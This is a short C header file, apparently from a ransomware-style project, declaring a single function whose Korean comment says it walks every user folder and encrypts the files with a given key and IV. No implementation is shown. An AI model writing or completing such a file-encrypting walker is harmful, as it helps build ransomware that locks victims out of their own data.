// encryptor_walker.h
#ifndef ENCRYPTOR_WALKER_H
#define ENCRYPTOR_WALKER_H

#ifdef __cplusplus
extern "C" {
#endif

	// 전체 사용자 폴더를 순회하며 암호화 수행
	void encrypt_all_targets(const unsigned char* key, const unsigned char* iv);

#ifdef __cplusplus
}
#endif

#endif // ENCRYPTOR_WALKER_H